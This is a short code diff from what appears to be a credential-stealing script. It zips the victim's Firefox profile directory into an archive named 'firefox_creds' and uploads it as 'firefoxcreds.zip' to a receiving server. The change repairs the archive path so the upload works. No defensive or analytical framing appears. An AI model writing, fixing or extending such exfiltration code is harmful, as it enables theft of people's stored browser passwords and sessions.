@@ -11,10 +11,10 @@ try:
 except Exception as e:
     print(e)
 
-firefox_creds = f"{pu.create_tmp_path()}.zip"
+firefox_creds = f"{pu.create_tmp_path()}"
 
 try:
     shutil.make_archive(firefox_creds, 'zip', pu.get_firefox_path())
-    netutils.send_file(firefox_creds, "firefoxcreds.zip" ,recvserv)
+    netutils.send_file(firefox_creds + ".zip", "firefoxcreds.zip" ,recvserv)
 except Exception as e:
     print(e)
